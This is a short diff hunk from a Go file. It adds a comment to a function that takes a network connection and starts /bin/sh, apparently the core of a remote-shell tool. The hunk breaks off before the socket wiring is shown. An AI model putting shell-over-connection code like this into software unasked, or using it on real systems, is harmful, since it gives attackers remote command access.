@@ -10,6 +10,7 @@ import (
 
 func execCommand(conn net.Conn) {
 	fmt.Println("Executing shell...")
+	// replace with command from cli
 	cmd := exec.Command("/bin/sh")
 
 	stdin, err := cmd.StdinPipe()
